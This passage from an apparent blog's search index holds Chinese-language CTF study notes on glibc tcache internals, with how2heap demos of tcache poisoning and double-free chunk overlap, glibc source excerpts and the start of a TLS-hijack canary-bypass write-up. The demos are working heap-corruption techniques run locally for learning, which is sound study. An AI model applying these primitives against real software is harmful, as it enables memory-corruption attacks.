style="zoom:80%;"><p>malloc（0x90）成功申请</p><p>累死</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Spirit </tag>
            
            <tag> Unlink </tag>
            
            <tag> Tcache Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Poisoning &amp;&amp; Tcache Dup</title>
      <link href="/2023/03/27/Tcache_poisoning_dup/"/>
      <url>/2023/03/27/Tcache_poisoning_dup/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache-Poisoning"><a href="#Tcache-Poisoning" class="headerlink" title="Tcache Poisoning"></a>Tcache Poisoning</h2><p>how2heap tcache_poisoning.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// disable buffering</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">           <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">           <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_poisoning</span><br><span class="line">This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer to an arbitrary location (in this case, the stack).</span><br><span class="line">The attack is very similar to fastbin corruption attack.</span><br><span class="line">After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span><br><span class="line">We have to create and free one more chunk for padding before fd pointer hijacking.</span><br><span class="line"></span><br><span class="line">The address we want malloc() to return is 0x7fffffffe448.</span><br><span class="line">Allocating 2 buffers.</span><br><span class="line">malloc(128): 0x603260</span><br><span class="line">malloc(128): 0x6032f0</span><br><span class="line">Freeing the buffers...</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x603260 ].</span><br><span class="line">We overwrite the first 8 bytes (fd/next pointer) of the data at 0x6032f0</span><br><span class="line">to point to the location to control (0x7fffffffe448).</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x7fffffffe448 ].</span><br><span class="line">1st malloc(128): 0x6032f0</span><br><span class="line">Now the tcache list has [ 0x7fffffffe448 ].</span><br><span class="line">2nd malloc(128): 0x7fffffffe448</span><br><span class="line">We got the control</span><br></pre></td></tr></table></figure><p>覆盖tachebin的next为我们想申请的地址即可</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091111479.png" alt="image-20230327091111479"></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091058041.png" alt="image-20230327091058041"></p><p>2.26甚至没有检查tcache的size是否符合要求</p><h2 id="Tcache-Dump"><a href="#Tcache-Dump" class="headerlink" title="Tcache Dump"></a>Tcache Dump</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span>* a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_dup</span><br><span class="line">This file demonstrates a simple double-free attack with tcache.</span><br><span class="line">Allocating buffer.</span><br><span class="line">malloc(8): 0x555555756260</span><br><span class="line">Freeing twice...</span><br><span class="line">free(): double free detected in tcache </span><br><span class="line">grxer@grxer:~$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure><p>额，因为doublefree crash掉了，2.27的libc不应该呀，找了下资料发现2020.9.10 2.27-3Ubuntu1.3 用glibc2.31源码进行了一波patch</p><p><strong>我们可以利用unsortedbin来overlapping，构造doublefree</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> attack[<span class="number">15</span>] = <span class="string">&quot;6666666&quot;</span>;</span><br><span class="line">    <span class="type">void</span>* fill[<span class="number">7</span>];</span><br><span class="line">    <span class="type">void</span>* unsortbin;</span><br><span class="line">    <span class="type">void</span>* tcachebin;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        fill[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    unsortbin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    tcachebin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止和topchunk合并</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(fill[i]);</span><br><span class="line">    <span class="built_in">free</span>(unsortbin);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="type">long</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    ptr[<span class="number">18</span>] = &amp;attack;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;hacker&quot;</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2<span class="number">.27</span>&gt; ./tcache_dup</span><br><span class="line"><span class="number">6666666</span></span><br><span class="line">hacker</span><br></pre></td></tr></table></figure><p>先把申请到的前七个堆块释放掉</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140326972.png" alt="image-20230327140326972"></p><p>这样0x90的tcachebin满7个了</p><p><code>free(unsortbin);</code></p><p>就会丢进unsortedbin里</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140512916.png" alt="image-20230327140512916"></p><p><code>free(tcachebin);</code></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140608610.png" alt="image-20230327140608610"></p><p>tcachebin的低地址chunk unsortedbin是free的，会触发unlink操作</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141113916.png" alt="image-20230327141113916"></p><p><code>malloc(0x80);</code></p><p>让出一个tcachebin</p><p><code>free(tcachebin);</code></p><p>tcachebin进入tcachebin</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141335773.png" alt="image-20230327141335773"></p><p>这样我们就实现了chunk的overlapping ，</p><p><code>long* ptr = malloc(0xb0);</code></p><p><code>ptr[18] = &amp;attack;</code></p><p>把unsortedbin拿出来,在8*18&#x3D;0x90处也就是tcachebin的next区写入我们attack的栈地址，<strong>tcache bin next地址指向的是chunk的data区，和fastbin指向chunk头不同</strong></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327142253602.png" alt="image-20230327142253602"></p><p><code>malloc(0x80);</code><br><code>ptr = malloc(0x80);</code></p><p>ptr指向我们的attack地址，如果开了canary，这里的attack[15]数组大小至少为15(canary最后一字节为0),tcache_get里会<code>e-&gt;key = NULL;</code>会破坏掉canary</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache Attach </tag>
            
            <tag> Tcache Poisoning </tag>
            
            <tag> Tcache Dup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache</title>
      <link href="/2023/03/26/Tcache/"/>
      <url>/2023/03/26/Tcache/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><p><strong>Thread local caching</strong></p><p>Tcache 是 glibc <strong>2.26</strong> (ubuntu 17.10) 之后引入的，其目的是为了提升堆管理的性能,性能的提升总是伴随更多的安全问题</p><h2 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h2><h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>next指向下一个相同大小的free chunk的data区，而不是其他bin通常指向的chunk头 <strong>LIFO</strong></p><p><strong>2.29</strong> 版本以后的 tcache_entry 增加了key字段防止doublefree等攻击 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p><strong>glibc 2.32</strong>以后这里的next字段也会不同，会进行异或加密，后面再说，最新版本的可以值好像也进行了加密</p><h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>,通常是在第一个堆块,用来管理tcache</p><p><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</p><p>最多TCACHE_MAX_BINS 64个tcache bin从0x20-0x410 按0x10递增</p><h2 id="Tcache-how-2-work"><a href="#Tcache-how-2-work" class="headerlink" title="Tcache how 2 work"></a>Tcache how 2 work</h2><ol><li>第一次malloc，分配一块内存给tcache_perthread_struct，管理tcache </li><li>free时，size&lt;0x410(64位带chunke head)时，tcache链表少于7个未满，先放入tcaceh，满后和之前一样fastbin或其他合适bin，inuse位不会置零，不会合并</li><li>malloc时在tcache范围内，tcache有就拿，tcache没有时，如果<code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；<strong>因此 chunk 在 bin 中和 tcache 中的顺序会反过来</strong></li></ol><h2 id="RTFSC"><a href="#RTFSC" class="headerlink" title="RTFSC"></a>RTFSC</h2><h3 id="申请"><a href="#申请" class="headerlink" title="申请"></a>申请</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// tc_idx由 size 计算的 idx 在合法范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 进入与无 tcache 时类似的流程</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>tcache-&gt;entries[tc_idx]不为空时tcache_get(tc_idx)申请</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//把最新的tcacehchunk拿出来</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//判断index合法性</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>); <span class="comment">//判断tcache bin链是不是为空</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//把tcache bin链指向下一个chunk</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几乎没有保护</p><p><strong>glibc2.32</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"> <span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line"> &#123;</span><br><span class="line">   tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">   tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">   e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>取出时会进行xor解密，2.32的next会通过PROTECT_PTR异或加密，把存储next的地址右移12位后和next异或后把解密地址(也就是chunk真实地址)放到tcache struct中，这让我们之前fastbin attach类似的伪造chunk在这里难道增加</p><h2 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h2><p>_int_free()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// mp_.tcache_count=7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);  <span class="comment">//p要释放的chunk，tc_idx对应size的entries下标</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code></p><p>tcache_put()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> <span class="comment">//chunk要释放的chunk，tc_idx对应size的entries下标</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//得到chunk的tcache_entry结构体 </span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//64</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//chunk的next指向对应size链的最新一个chunk</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;<span class="comment">//把当前chunk放入 tcache_perthread_struct管理结构</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//++当前size数量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧几乎没有保护</p><p><strong>glibc2.29</strong>有了key</p><p>_int_free函数里会多会检测 key 字段是否为 tcache，如果相等则检测 free 的指针值是否在对应的tcache_entry 链上，出现则视为程序在double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>glibc2.32</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">  detect a double free.  */</span></span><br><span class="line">e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure><p>多了PROTECT_PTR 对当前释放chunk的tcache_entry的next指针变为存储当前next地址和next要指向chunkdata地址异或的值</p><p>看个例子</p><p><img src="/2023/03/26/Tcache/image-20230326234600469.png" alt="image-20230326234600469"></p><p>pwndbg帮我们自动解析了</p><p><img src="/2023/03/26/Tcache/image-20230326234343508.png" alt="image-20230326234343508"></p><p>0x55500000c6d9是怎么来的呢？ 红色部分异或来的：0x555555559380 xor 0x555555559&#x3D;0x55500000C6D9</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLS Hijack Bypass Canary</title>
      <link href="/2023/03/26/TLS-Hijack/"/>
      <url>/2023/03/26/TLS-Hijack/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/173QtGe1It9EX2OiocC0ZBw">https://pan.baidu.com/s/173QtGe1It9EX2OiocC0ZBw</a><br>提取码：1pcz</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/pwn&gt; checksec checkin </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/checkin&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>大致扫了一些，多线程的一个程序</p><p>主线程把flag读取到bss段</p><p>pthread_create创建的一个子线程的start_routine函数有栈溢出问题，溢出很大</p><p>pthread_join()等待阻塞</p><p>泄露canary基本不可能了，本来想着SSP(Stack Smashing Protect)Leak能不能把他的argv[0](__libc_argv)覆盖为flag地址，再破坏canary输出flag，但是不在一个线程栈区不一样</p><h3 id="线程共享"><a href="#线程共享" class="headerlink" title="线程共享"></a>线程共享</h3><p>在一个进程中，主线程和通过pthread_create()创建出来的子线程共享以下内容：</p><ol><li>进程的代码段、数据段、堆段和共享库等被映射到进程虚拟地址空间中的所有内存区域。</li><li>进程打开的文件描述符、信号处理器等进程级别的资源。</li><li>进程环境变量以及命令行参数等。</li><li>全局变量和静态变量等存储在bss段和data段中的数据。</li><li>动态分配的堆内存（malloc、calloc等）。</li><li>在进程中使用pthread_key_create()创建的线程特定数据（Thread-specific 